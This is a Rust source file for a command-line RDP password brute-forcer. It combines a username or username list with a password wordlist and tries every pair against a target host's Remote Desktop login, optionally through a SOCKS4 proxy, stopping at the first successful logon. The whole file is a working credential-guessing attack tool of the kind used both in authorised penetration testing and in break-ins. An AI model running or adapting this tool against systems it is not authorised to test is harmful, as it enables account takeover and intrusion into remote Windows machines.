use clap::Parser;
use rdp::core::client::Connector;
use socks::Socks4Stream;
use socks::TargetAddr;
use std::{
    net::{SocketAddr, TcpStream},
    path::PathBuf,
};

#[derive(Debug, Clone)]
struct PasswordCombo {
    username: String,
    password: String,
}

#[derive(Debug, Clone, Parser)]
struct ProgramOptions {
    #[arg(long, help="Windows logon domain. Optional, default is 'domain'")]
    logon_domain: Option<String>,

    #[arg(long, help="A target IP:PORT pair")]
    target: SocketAddr,

    #[arg(long, help="A proxy IP:PORT pair")]
    proxy: Option<SocketAddr>,

    #[arg(long, help="A file path on disk to use for a password source")]
    password_list: PathBuf,

    #[arg(long, help="A file on disk as a username source (if not used, specify --username)")]
    username_list: Option<PathBuf>,

    #[arg(long, help="A specific username to try (if not used, specify --username-list")]
    username: Option<String>,
}

impl std::fmt::Display for PasswordCombo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "<user: {}, pass: {}>", &self.username, &self.password)
    }
}

// Helper to create wordlists from a file.
impl PasswordCombo {
    fn combos_with_username_and_wordlists(
        username: Option<&String>,
        username_list: Option<&std::path::PathBuf>,
        wordlist: &std::path::Path,
    ) -> Result<Vec<PasswordCombo>, Box<dyn std::error::Error>> {
        let mut out = vec![];

        // set passwords
        let passwords = std::fs::read_to_string(wordlist)?
            .split("\n")
            .map(|v| v.trim().to_string())
            .collect::<Vec<String>>();

        // add passwords from list to one username
        if let Some(username) = username {
            // add username/pass combos
            for password in &passwords {
                out.push(PasswordCombo {
                    username: username.into(),
                    password: password.clone(),
                });
            }
        }

        // if has username list, add combos O((n*m)^2)
        if let Some(username_list) = username_list {
            let usernames = std::fs::read_to_string(username_list)?
                .split("\n")
                .map(|v| v.trim().to_string())
                .collect::<Vec<String>>();

            // add each pair
            for username in &usernames {
                for password in &passwords {
                    out.push(PasswordCombo {
                        username: username.into(),
                        password: password.clone(),
                    });
                }
            }
        }

        Ok(out)
    }
}

/// Try a password combo.
/// Returns true if successful, false otherwise.
fn try_combo(
    connection: &ProgramOptions,
    combo: &PasswordCombo,
) -> Result<(), rdp::model::error::Error> {
    let tcp = match connection.proxy {
        Some(proxy_addr) => {
            let socks_tcp = Socks4Stream::connect(
                TargetAddr::Ip(proxy_addr),
                TargetAddr::Ip(connection.target),
                "",
            )
            .unwrap();

            socks_tcp.into_inner()
        }
        None => TcpStream::connect(connection.target).expect("target ip to connect successfully"),
    };

    // make a session connector
    let mut connector = Connector::new().screen(800, 600).credentials(
        connection.logon_domain.clone().unwrap_or("domain".into()),
        combo.username.clone(),
        combo.password.clone(),
    );

    // connect
    match connector.connect(tcp) {
        Ok(mut client) => {
            client.shutdown().unwrap();
            Ok(())
        }
        Err(e) => return Err(e),
    }
}

fn main() {
    let opts = ProgramOptions::parse();

    println!("connecting using options: {:?}", opts);

    // ensure we have one source of usernames
    if opts.username.is_none() && opts.username_list.is_none() {
        panic!("please pass --username or --username-list in order to set user to scan.");
        std::process::exit(1);
    }

    // make a wordlist
    let to_try = PasswordCombo::combos_with_username_and_wordlists(
        opts.username.as_ref(),
        opts.username_list.as_ref(),
        &opts.password_list,
    )
    .expect("wordlist to load successfully");

    // print info
    println!("got {} credential pairs to try.", to_try.len());
    if to_try.len() == 0 {
        panic!("critical: no entries in credential list")
    }

    // try each combo and print status
    for (i, combo) in to_try.iter().enumerate() {
        print!("#{}: try: {} -> ", i, combo);
        match try_combo(&opts, &combo) {
            Ok(_) => {
                println!("success!!");
                break;
            }
            Err(e) => {
                println!("fail {:?}", e)
            }
        }
    }
}
